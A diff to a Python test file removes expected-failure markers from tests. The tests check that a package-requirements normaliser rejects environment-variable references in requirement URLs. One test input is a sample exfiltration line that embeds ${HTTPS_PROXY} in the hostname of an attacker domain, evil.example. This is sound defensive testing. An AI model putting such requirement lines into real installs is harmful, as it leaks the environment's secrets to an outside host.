@@ -28,11 +28,6 @@ from meshforge.agent.envs.hash import normalize_requirements
 pytestmark = [pytest.mark.component]
 
 
-@pytest.mark.xfail(
-    strict=True,
-    reason="T-15 (minor): ${VAR} in a requirement URL is accepted by the "
-    "wheels-only gate and expanded by the installer with the agent's environment",
-)
 def test_the_normaliser_refuses_environment_references() -> None:
     for line in (
         b"pkg @ https://${HTTPS_PROXY}.evil.example/pkg-1-py3-none-any.whl\n",
@@ -67,11 +62,6 @@ if default_uv_argv():
         httpd.server_close()
 
     @pytest.mark.asyncio
-    @pytest.mark.xfail(
-        strict=True,
-        reason="T-15 (minor): the agent's HOME reaches the host named in a "
-        "job's requirement URL (real uv expands ${HOME})",
-    )
     async def test_the_agents_environment_never_reaches_a_url_host(
         tmp_path: Path, requests_seen: tuple[str, list[str]]
     ) -> None:
